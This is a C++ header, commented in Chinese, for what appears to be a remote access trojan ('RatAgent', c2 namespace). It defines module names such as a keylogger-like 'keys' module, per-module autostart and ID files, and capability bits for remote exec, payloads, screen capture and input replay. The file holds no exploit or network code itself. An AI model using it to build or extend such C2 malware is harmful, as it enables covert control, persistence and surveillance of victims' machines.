// module_id.h — 模块（能力）标识与命名空间
//
// 模块化的地基：同一份 core 源码可以编成多个"模块 agent"（全量 / 远程桌面 / …）。
// 它们在同一台机器上共存时，**必须各有自己的落盘物**，否则会互相破坏：
//   - <module>.id           身份。共用会让服务器按同一个 agent_id 索引，
//                           Registry.Register 冲突时踢掉旧会话 → 两个模块互相踢下线
//   - <module>.log          日志互相覆盖
//   - <module>.autostart.args  自启参数互相误触发
//
// 由各工程的预处理器定义提供：RAT_MODULE_ID="screen"（默认 "sys"）。
//
// 命名空间规则：
//   %LOCALAPPDATA%\RatAgent\<module>.id / <module>.log / <module>.autostart.args
//   EXE 形态：CWD 下的 <module>.id（保留"相对 CWD"的历史行为，只加模块前缀）
//
// 停止事件名**刻意不带模块前缀**（Local\RatAgentStop.<agent_id_hex>）：
//   各模块的 id 是各自随机的 16 字节，天然不会撞名；不加前缀才能让**任一模块**的
//   DLL 导出 Stop 去停**任意模块**的实例（加了前缀反而只能停自己这一种）。
//
// 注意（新增模块工程时）：RAT_MODULE_ID 与 RAT_MODULE_CAPS 都**必须显式改写**，
//   忘了改会得到 "sys" + 系统类能力位，和全量（系统类）agent 撞在一起。
#pragma once

#include <cstdint>

// 模块名（小写短名：sys / screen / file / keys / template …）
#ifndef RAT_MODULE_ID
#define RAT_MODULE_ID "sys"
#endif

namespace c2 {

// 本产物的模块名
constexpr const char* kModuleId = RAT_MODULE_ID;

// 能力位（对应服务端 Session.Plugins；`sessions` / `session <id>` 里可见）
constexpr uint32_t kCapSys = 1u << 0;      // 系统类：sysinfo / exec / payload
constexpr uint32_t kCapRemote = 1u << 1;   // 远程桌面：抓屏 / 屏幕流 / 输入回放

// 本模块的能力位图。各模块工程都用 RAT_MODULE_CAPS 覆盖（见各自的 vcxproj），
// 例如 sys → (c2::kCapSys)、screen → (c2::kCapRemote)。
// 兜底默认值与默认模块名一致（默认模块是 sys = 只有系统类能力）；
// 若某个构建没有定义它，得到的能力位不会凭空多出"远程桌面"。
#ifndef RAT_MODULE_CAPS
#define RAT_MODULE_CAPS (c2::kCapSys)
#endif

constexpr uint32_t kModuleCaps = (uint32_t)(RAT_MODULE_CAPS);

}  // namespace c2
